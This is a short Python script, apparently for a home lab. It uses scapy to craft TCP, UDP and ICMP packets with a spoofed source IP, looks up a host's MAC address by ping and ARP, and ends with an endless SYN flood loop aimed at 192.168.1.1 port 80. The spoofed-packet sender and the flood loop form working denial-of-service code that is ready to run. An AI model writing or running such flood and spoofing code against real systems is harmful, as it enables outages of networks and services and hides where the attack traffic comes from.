from scapy.all import *
import socket,subprocess

class PakMaker:
    def __init__(self,type,ipsource,ipdest,sport,dport,flagsbool,flags,seq):
        self.type = type
        self.ipsource = ipsource
        self.ipdest = ipdest
        self.sport = sport
        self.dport = dport
        self.flagsbool = flagsbool
        self.flags = flags
        self.seq = seq

    def SendPak(self):

        if self.type == "TCP":

            if self.flagsbool and self.flags=='S':
                return send(IP(src=self.ipsource,dst=self.ipdest)/TCP(sport=self.sport,dport=self.dport,flags=self.flags,seq=self.seq),verbose=False)

            elif self.flagsbool:
                return send(IP(src=self.ipsource,dst=self.ipdest)/TCP(sport=self.sport,dport=self.dport,flags=self.flags),verbose=False)

            return send(IP(src=self.ipsource,dst=self.ipdest)/TCP(sport=self.sport,dport=self.dport),verbose=False) #No flag

        elif(self.type == "UDP"):
            
            return(send(IP(src=self.ipsource,dst=self.ipdest)/UDP(sport=self.sport,dport=self.dport),verbose=False))
            
        else: #ICMP

            return send(IP(src=self.ipsource,dst=self.ipdest)/ICMP(),verbose=False) #No flag

if __name__ == "__main__":
    testip="192.168.1.200" #powerline

    pkt1tcp=PakMaker("TCP",testip,"192.168.1.189",1234,8080,False,'',0)
    pkt2tcp=PakMaker("TCP",testip,"192.168.1.189",1234,8080,True,'U',0)
    pkt3tcp=PakMaker("TCP",testip,"192.168.1.189",1234,8080,True,'S',1110)

    pkt4icmp=PakMaker("ICMP",testip,"192.168.1.189",0,0,False,'',0)

    pkt5udp=PakMaker("UDP",testip,"192.168.1.189",1234,8080,False,'',0)

    print("PKT2 (None = Sent): ",pkt2tcp.SendPak())
    print("PKT4ICMP (None = Sent): ",pkt4icmp.SendPak())
    print("PKT5UDP (None = Sent): ",pkt5udp.SendPak())

    print("##########")
    print("HostName: ",socket.gethostname())
    print("GetHostByName (IP): ",socket.gethostbyname(socket.gethostname()+".local"))

    print("##########")
    if(re.search('0% packet loss',(subprocess.run(['ping', '-c','1',testip], capture_output=True, text=True)).stdout)):
        print("Ping OK, gonna search MAC with ARP")  

        stringamac=(subprocess.run(['arp', '-a',testip], capture_output=True, text=True)).stdout
        print(re.search(r'(([a-fA-F0-9]{2}[:]){5}[a-fA-F0-9]{2})', stringamac).group(0))

    else:
        print("Ping Failed")

    print("##########")

    MACstring="38:94:ed:7d:b5:1a"
    if(re.search(r'(([a-fA-F0-9]{2}[:]){5}[a-fA-F0-9]{2})', MACstring)):
        print("Valid MAC")
    else:
        print("Invalid MAC")
    print("##########")

    try:
        input("Press Enter to start SYN Flood - ctrl^c for closing the program\n")
    except KeyboardInterrupt:
        print("\n")
        exit()

    print("Starting SYN Flood")
    ip=IP(dst="192.168.1.1")
    tcpflood=TCP(dport=80,flags='S')
    send(ip/tcpflood,loop=1,inter=0.01,verbose=False)